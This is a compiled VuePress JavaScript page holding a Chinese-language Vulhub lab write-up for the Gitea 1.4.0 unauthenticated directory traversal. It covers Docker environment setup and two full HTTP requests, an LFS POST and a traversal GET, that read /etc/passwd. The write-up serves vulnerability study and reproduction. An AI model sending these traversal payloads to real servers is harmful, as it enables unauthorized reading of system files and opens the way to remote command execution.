import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c as l,a as e,b as i,d as t,e as d}from"./app-58e4a7d6.js";const c={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),u=e("p",null,"Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。",-1),p=e("p",null,"参考链接：",-1),v={href:"https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html",target:"_blank",rel:"noopener noreferrer"},g=d(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://you-ip:3000</code>，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）</p><p>安装完成后，新建一个用户<code>test</code>，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232045145.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后，需要执行一次<code>docker-compose restart</code>重启gitea服务。（原因详见第二个参考链接）</p><blockquote><p>如果不重启的话，session是存储在内存里的。只有第一次重启后，才会使用文件session，这一点需要注意。</p></blockquote><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。</p><p>打开gitea，找到刚才创建的公开项目，如<code>vulhub/repo</code>，发送如下数据包，添加一个Git LFS对象：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /test/repo.git/info/lfs/objects HTTP/1.1
Host: your-vps-ip:3000
Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 153

{
    &quot;Oid&quot;: &quot;....../../../etc/passwd&quot;,
    &quot;Size&quot;: 1000000,
    &quot;User&quot; : &quot;a&quot;,
    &quot;Password&quot; : &quot;a&quot;,
    &quot;Repo&quot; : &quot;a&quot;,
    &quot;Authorization&quot; : &quot;a&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232052600.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后，访问<code>http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</code>，即可看到<code>/etc/passwd</code>已被成功读取：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /test/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth HTTP/1.1
Host: your-vps-ip:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232053193.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16);function b(h,_){const n=s("ExternalLinkIcon");return o(),l("div",null,[r,u,p,e("ul",null,[e("li",null,[e("a",v,[i("https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html"),t(n)])]),e("li",null,[e("a",m,[i("https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html"),t(n)])])]),g])}const q=a(c,[["render",b],["__file","Gitea 1.4.0 目录穿越导致命令执行漏洞.html.vue"]]);export{q as default};
